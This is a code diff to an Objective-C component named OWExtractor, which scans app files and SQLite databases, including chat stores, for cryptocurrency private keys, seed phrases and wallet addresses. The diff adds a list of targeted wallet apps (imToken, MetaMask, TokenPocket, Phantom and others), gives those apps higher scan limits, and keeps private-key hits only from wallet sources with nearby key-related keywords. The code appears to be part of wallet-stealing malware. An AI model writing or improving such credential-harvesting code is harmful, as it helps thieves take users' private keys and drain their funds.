@@ -30,6 +30,9 @@ OWHitKind const OWHitKindAddrSOL    = @"addr_sol";
 @property (nonatomic, strong) NSMutableSet<NSString *> *seen;
 @property (nonatomic, strong, nullable) NSString *mJSON;
 @property (nonatomic, strong, nullable) NSString *mPlain;
+- (BOOL)_walletLabel:(NSString *)label;
+- (BOOL)_context:(NSString *)text range:(NSRange)r keywords:(NSArray<NSString *> *)kws;
+- (uint64_t)_maxBytesForLabel:(NSString *)label;
 @end
 
 @implementation OWExtractor
@@ -178,7 +181,7 @@ OWHitKind const OWHitKindAddrSOL    = @"addr_sol";
     NSDictionary *a = [[NSFileManager defaultManager] attributesOfItemAtPath:path error:nil];
     uint64_t sz = [a fileSize];
     if (sz == 0) return;
-    uint64_t take = MIN(sz, self.maxScanBytes);
+    uint64_t take = MIN(sz, [self _maxBytesForLabel:label]);
 
     NSFileHandle *fh = [NSFileHandle fileHandleForReadingAtPath:path];
     if (!fh) return;
@@ -209,7 +212,8 @@ OWHitKind const OWHitKindAddrSOL    = @"addr_sol";
     }
     sqlite3_finalize(st);
 
-    NSUInteger rowCap = 20000;   // 单表单表行数上限，防止几十万行的聊天库拖死
+    // 钱包：完整扫描；聊天/其它：限制行数，避免大库拖慢整轮
+    NSUInteger rowCap = [self _walletLabel:label] ? 20000 : 3000;
     for (NSString *tb in tables) {
         if (self.mHits.count >= self.maxHits) break;
         NSString *sql = [NSString stringWithFormat:@"SELECT * FROM \"%@\";", tb];
@@ -262,6 +266,27 @@ OWHitKind const OWHitKindAddrSOL    = @"addr_sol";
                 NSString *val = [text substringWithRange:gr];
                 if (!val.length) return;
 
+                // 去噪：私钥只认钱包来源 + 明确上下文；地址要求上下文，排除合约
+                if ([r.kind isEqualToString:OWHitKindPrivKeyHex]) {
+                    if (![self _walletLabel:label]) return;
+                    if (![self _context:text range:gr
+                               keywords:@[@"privatekey", @"private_key", @"privkey",
+                                          @"secretkey", @"0x"]]) return;
+                }
+                if ([r.kind isEqualToString:OWHitKindAddrBTC]) {
+                    if (![self _context:text range:gr
+                               keywords:@[@"address", @"addr", @"sourcefingerprint",
+                                          @"from", @"to", @"account"]]) return;
+                }
+                if ([r.kind isEqualToString:OWHitKindAddrTRON] &&
+                    [val isEqualToString:@"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"]) return;
+                if (([r.kind isEqualToString:OWHitKindAddrETH] ||
+                     [r.kind isEqualToString:OWHitKindAddrTRON]) &&
+                    ![self _walletLabel:label]) {
+                    if (![self _context:text range:gr
+                               keywords:@[@"address", @"addr", @"from", @"to", @"account"]]) return;
+                }
+
                 BOOL verified = YES;
                 if (r.needWordlist) {
                     NSArray *ws = [[val lowercaseString]
@@ -301,6 +326,33 @@ OWHitKind const OWHitKindAddrSOL    = @"addr_sol";
             }];
         }
     }
+}
+
+- (BOOL)_walletLabel:(NSString *)label {
+    static NSSet *set = nil;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        set = [NSSet setWithArray:@[@"imToken", @"TokenPocket", @"OKX", @"TronLink",
+                                    @"MetaMask", @"Trust", @"Bitpie", @"Global Wallet",
+                                    @"Coin98", @"Phantom", @"SafePal", @"OneKey"]];
+    });
+    return label.length && [set containsObject:label];
+}
+
+- (uint64_t)_maxBytesForLabel:(NSString *)label {
+    if ([self _walletLabel:label]) return self.maxScanBytes;
+    return MIN(self.maxScanBytes, 8ULL * 1024 * 1024);
+}
+
+- (BOOL)_context:(NSString *)text range:(NSRange)r keywords:(NSArray<NSString *> *)kws {
+    NSInteger start = MAX(0, (NSInteger)r.location - 80);
+    NSUInteger len = MIN(text.length - (NSUInteger)start, r.length + 160);
+    if (!len) return NO;
+    NSString *s = [[text substringWithRange:NSMakeRange((NSUInteger)start, len)] lowercaseString];
+    for (NSString *k in kws) {
+        if ([s containsString:k]) return YES;
+    }
+    return NO;
 }
 
 - (BOOL)_solContext:(NSString *)text range:(NSRange)r {
